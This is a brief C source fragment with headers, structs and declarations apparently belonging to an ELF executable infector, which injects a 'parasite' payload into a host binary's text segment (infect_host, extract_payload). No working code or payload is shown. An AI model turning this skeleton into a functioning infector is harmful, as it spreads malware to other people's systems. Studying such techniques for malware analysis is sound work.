#include<stdio.h>
#include<string.h>
#include<errno.h>
#include<elf.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/stat.h>
#include<fcntl.h>


struct Payload
{
	Elf64_Addr parasite_address;
	Elf64_Off parasite_offset;
	uint64_t size;
	uint8_t *payload;
};

struct Host
{
	Elf64_Off text_segment_offset;
	Elf64_Off text_segment_end;
	Elf64_Off pos;
	uint64_t size;
	uint8_t *host;
};


void open_map_file(char *filename);
void extract_payload(char *filename);
int find_phdr();
void infect_host(int segment);
